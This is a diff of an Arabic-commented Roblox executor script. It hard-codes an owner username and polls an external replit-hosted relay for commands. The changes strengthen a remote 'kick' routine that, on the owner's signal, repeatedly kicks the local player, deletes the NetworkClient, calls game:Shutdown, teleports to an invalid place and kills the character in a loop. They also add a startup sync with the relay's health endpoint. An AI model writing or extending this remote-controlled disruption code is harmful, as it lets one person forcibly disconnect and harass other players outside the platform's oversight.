@@ -12,7 +12,8 @@ local OwnerUsername = "azoz11211"
 local isOwnerUser = LocalPlayer.Name:lower() == OwnerUsername:lower()
 
 -- ====== T18 HTTP Relay (لا يمر بشات روبلوكس) ======
-local T18_API_BASE = "https://96f335d0-2562-4176-bd47-29990b78a733-00-37gx75qtinqqg.picard.replit.dev/api/t18"
+-- ✅ سيرفر دائم لا ينام
+local T18_API_BASE = "https://hello-world--azozxxgfxx.replit.app/api/t18"
 local HttpService_T18 = game:GetService("HttpService")
 
 local function t18_getHttpFn()
@@ -906,16 +907,38 @@ local localRespawnLoopActive = false
 local localRespawnLoopThread = nil
 
 local function applyKickLocal()
+    -- المحاولة 1: Kick رسمي (الأنظف، يشتغل في معظم الـ executors)
     pcall(function()
-        TeleportService_T18:Teleport(0, LocalPlayer)
+        LocalPlayer:Kick("kicked by t_18")
     end)
+
+    -- المحاولة 2: قطع الاتصال بالسيرفر مباشرة
+    pcall(function()
+        local nc = game:FindService("NetworkClient")
+        if nc then nc:Remove() end
+    end)
+
+    -- المحاولة 3: محاولة Shutdown من العميل
+    pcall(function()
+        game:Shutdown()
+    end)
+
+    -- المحاولة 4: تنقّل لمكان غير صالح يفصل اللاعب
+    pcall(function()
+        TeleportService_T18:Teleport(1, LocalPlayer)
+    end)
+
+    -- fallback أخير: قتل متكرر + محاولة Kick متكررة
     task.spawn(function()
-        for _ = 1, 6 do
+        for _ = 1, 12 do
             pcall(function()
                 local char = LocalPlayer.Character
                 if char then char:BreakJoints() end
             end)
-            task.wait(0.4)
+            pcall(function()
+                LocalPlayer:Kick("kicked by t_18")
+            end)
+            task.wait(0.3)
         end
     end)
 end
@@ -1029,7 +1052,27 @@ local function t18_dispatchEvent(ev)
 end
 
 local t18_lastEventId = 0
+local t18_initialized = false
 task.spawn(function()
+    -- ⚠️ مهم: نتجاهل كل الأحداث القديمة الموجودة قبل تشغيل السكربت
+    -- هذا يمنع إعادة تطبيق الطرد على اللاعب لما يدخل اللعبة من جديد
+    while not t18_initialized do
+        pcall(function()
+            local healthUrl = T18_API_BASE .. "/health"
+            local res = t18_httpRequest({ Url = healthUrl, Method = "GET" })
+            if res and res.Body then
+                local data = t18_jsonDecode(res.Body)
+                if data and tonumber(data.nextId) then
+                    t18_lastEventId = math.max(0, tonumber(data.nextId) - 1)
+                    t18_initialized = true
+                end
+            end
+        end)
+        if not t18_initialized then
+            task.wait(2)
+        end
+    end
+
     while true do
         pcall(function()
             local url = string.format(
